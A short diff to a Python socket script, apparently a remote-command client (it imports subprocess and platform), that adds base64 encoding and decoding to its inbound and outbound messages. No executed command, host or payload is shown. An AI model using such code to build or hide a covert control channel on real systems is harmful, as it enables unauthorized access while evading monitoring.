@@ -4,6 +4,7 @@ import platform
 import socket
 import subprocess
 import time
+import base64
 
 
 def inbound():
@@ -11,14 +12,17 @@ def inbound():
     message = ""
     while True:
         try:
-            message += sock.recv(1024).decode()
+            message = sock.recv(1024).decode()
+            message = base64.b64decode(message)
+            message = message.decode().strip()
             return message
         except Exception:
             sock.close()
 
 
 def outbound(message):
-    response = str(message).encode()
+    response = str(message)
+    response = base64.b64encode(bytes(response, encoding='utf'))
     sock.send(response)
 
 
